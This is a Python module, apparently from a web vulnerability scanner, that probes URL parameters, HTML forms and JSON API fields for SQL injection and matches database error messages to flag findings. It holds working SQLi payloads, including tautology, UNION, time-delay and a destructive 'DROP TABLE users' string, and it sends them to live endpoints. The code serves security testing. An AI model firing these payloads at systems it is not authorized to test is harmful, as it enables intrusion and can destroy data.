"""
SQL Injection Testing Module
Tests GET/POST parameters for SQL injection vulnerabilities
"""
import re
import time
from .base import BaseModule
from .crawler import CrawlerModule


# Error-based SQLi detection patterns
SQL_ERRORS = {
    'MySQL': [
        r'You have an error in your SQL syntax',
        r'mysql_fetch_array\(\)',
        r'mysql_num_rows\(\)',
        r'MySQL server version for the right syntax',
        r'SQLSTATE\[HY000\].*mysql',
    ],
    'MSSQL': [
        r'Unclosed quotation mark after the character string',
        r'Incorrect syntax near',
        r"Microsoft OLE DB Provider for SQL Server",
        r'ODBC SQL Server Driver',
        r'SQLServer JDBC Driver',
    ],
    'Oracle': [
        r'ORA-\d{5}:',
        r'Oracle error',
        r'quoted string not properly terminated',
    ],
    'PostgreSQL': [
        r'PostgreSQL.*ERROR',
        r'pg_query\(\):',
        r'PSQLException',
        r'unterminated quoted string at or near',
    ],
    'SQLite': [
        r'SQLite/JDBCDriver',
        r'sqlite3.OperationalError',
        r'\[SQLITE_ERROR\]',
    ],
    'Generic': [
        r'SQL syntax.*MySQL',
        r'Warning.*mysqli?_',
        r'valid MySQL result',
        r'MySqlClient\.',
        r'com\.mysql\.jdbc',
        r'Zend_Db_(Adapter|Statement)_Exception',
        r'JDBC Exception',
    ]
}

# Basic SQLi payloads
SQLI_PAYLOADS = [
    "'",                          # Simple quote
    "''",                         # Double quote
    "`",                          # Backtick
    "' OR '1'='1",               # Classic OR
    "' OR 1=1--",                # OR with comment
    "' OR 1=1#",                 # MySQL comment
    '" OR "1"="1',               # Double-quote variant
    "1' AND SLEEP(5)--",         # Time-based MySQL
    "1' AND 1=1--",              # Boolean-based
    "1' AND 1=2--",              # Boolean-based (false)
    "' UNION SELECT NULL--",     # UNION-based
    "' UNION SELECT NULL,NULL--",
    "'; DROP TABLE users--",     # Destructive (detection only)
    "1; WAITFOR DELAY '0:0:5'--",  # Time-based MSSQL
    "' OR SLEEP(5)--",          # Time-based
    "1 AND 1=1",                # Numeric
    "1 AND 1=2",                # Numeric false
    "' HAVING 1=1--",
    "' ORDER BY 1--",
    "' ORDER BY 100--",         # Column count detection
]

TIME_PAYLOADS = [
    ("' AND SLEEP(5)--", 5, 'MySQL/MariaDB'),
    ("'; WAITFOR DELAY '0:0:5'--", 5, 'MSSQL'),
    ("' AND pg_sleep(5)--", 5, 'PostgreSQL'),
    ("' OR SLEEP(5)=0 LIMIT 1--", 5, 'MySQL'),
    ("1; SELECT SLEEP(5)--", 5, 'MySQL'),
]


class SQLiModule(BaseModule):
    """SQL Injection testing module."""

    def run(self) -> dict:
        # Utilize shared scan context to avoid redundant crawls
        endpoints = self.context.get('endpoints')
        forms = self.context.get('forms')

        if endpoints is None or forms is None:
            crawler = CrawlerModule(self.config)
            crawl_data = crawler.run()
            endpoints = crawl_data.get('endpoints', [])
            forms = crawl_data.get('forms', [])

        endpoints = endpoints or [self.url]
        forms = forms or []

        # Test URL parameters
        self._test_url_params(self.url)
        for ep in endpoints[:20]:
            self._test_url_params(ep)
            if any(p in ep.lower() for p in ('/api/', '/v1/', '/v2/', '/rest/', '/auth/')):
                self._test_json_sqli(ep)

        # Test forms
        for form in forms[:12]:
            self._test_form(form)

        return self.result({'endpoints_tested': len(endpoints), 'forms_tested': len(forms)})

    def _test_url_params(self, url):
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return

        for param in params:
            original_params = dict(params)
            for payload in SQLI_PAYLOADS:
                test_params = dict(original_params)
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))

                resp = self.get(test_url)
                if resp:
                    vuln, db_type = self._check_error(resp.text)
                    if vuln:
                        self.add_finding(
                            f'SQL Injection: {param}',
                            'CRITICAL',
                            f'Error-based SQLi in parameter "{param}" ({db_type})',
                            f'Payload: {payload}\nURL: {test_url[:200]}',
                            'Use parameterized queries/prepared statements. Never concatenate user input into SQL.'
                        )
                        break

            # Time-based detection with differential confirmation
            self._time_based_test(url, parsed, param, params)

    def _time_based_test(self, url, parsed, param, params):
        from urllib.parse import parse_qs, urlencode, urlunparse
        # 1. Measure baseline latency T0
        t0_start = time.time()
        base_resp = self.get(url)
        t0 = time.time() - t0_start
        if not base_resp:
            return

        for payload, sleep_time, db_name in TIME_PAYLOADS:
            test_params = dict(params)
            test_params[param] = [payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))

            start = time.time()
            resp = self.get(test_url)
            elapsed = time.time() - start

            # If delayed significantly compared to baseline
            if elapsed >= (t0 + sleep_time - 1.0):
                # 2. Control test with 0 sleep / benign payload to prevent network lag false positives
                control_params = dict(params)
                control_params[param] = ["' AND 1=1--"]
                ctrl_url = urlunparse(parsed._replace(query=urlencode(control_params, doseq=True)))
                ctrl_start = time.time()
                ctrl_resp = self.get(ctrl_url)
                ctrl_elapsed = time.time() - ctrl_start

                # Only confirm if control request was fast and sleep request was truly delayed
                if ctrl_elapsed < (t0 + 2.0) and elapsed >= (ctrl_elapsed + sleep_time - 1.5):
                    self.add_finding(
                        f'Time-Based SQLi: {param}',
                        'CRITICAL',
                        f'Time-based blind SQLi confirmed differentially in "{param}" ({db_name})',
                        f'Payload: {payload}\nSleep response: {elapsed:.1f}s | Baseline: {t0:.1f}s | Control: {ctrl_elapsed:.1f}s',
                        'Use parameterized queries / prepared statements.'
                    )
                    break

    def _test_json_sqli(self, url):
        """Test JSON endpoints, preserving primitive types (booleans/ints) to avoid 400 Bad Request."""
        sample_templates = [
            {"id": 1, "username": "admin", "active": True, "limit": 10},
            {"query": "test", "page": 1, "status": "active", "filter": ""},
        ]
        sqli_tests = ["' OR '1'='1", "1' AND SLEEP(5)--", "1' ORDER BY 1--"]

        for template in sample_templates:
            for field_name, original_val in template.items():
                # Only inject into string or ID fields; preserve booleans/structural elements
                if isinstance(original_val, bool):
                    continue  # Do not mutate boolean types

                for payload in sqli_tests:
                    data = dict(template)
                    data[field_name] = f"{original_val}{payload}" if isinstance(original_val, str) else payload

                    resp = self.post(url, json=data)
                    if resp and resp.text:
                        vuln, db_type = self._check_error(resp.text)
                        if vuln:
                            self.add_finding(
                                f'SQL Injection in JSON API: {field_name}',
                                'CRITICAL',
                                f'Error-based SQLi detected in JSON field "{field_name}" ({db_type})',
                                f'Endpoint: {url}\nPayload: {payload}',
                                'Use parameterized queries in all backend API handlers.'
                            )
                            return

    def _test_form(self, form):
        action = form.get('action', self.url)
        method = form.get('method', 'GET').upper()
        fields = form.get('fields', {})

        if not fields:
            return

        for field_name in fields:
            for payload in SQLI_PAYLOADS[:5]:  # Quick test on forms
                test_data = dict(fields)
                test_data[field_name] = payload

                if method == 'POST':
                    resp = self.post(action, data=test_data)
                else:
                    resp = self.get(action, params=test_data)

                if resp:
                    vuln, db_type = self._check_error(resp.text)
                    if vuln:
                        self.add_finding(
                            f'SQL Injection in Form Field: {field_name}',
                            'CRITICAL',
                            f'Error-based SQLi in form field "{field_name}" ({db_type})',
                            f'Payload: {payload}\nAction: {action}',
                            'Use parameterized queries for all database operations.'
                        )
                        break

    def _check_error(self, body):
        """Returns (is_vulnerable, db_type)."""
        for db_type, patterns in SQL_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    return True, db_type
        return False, None
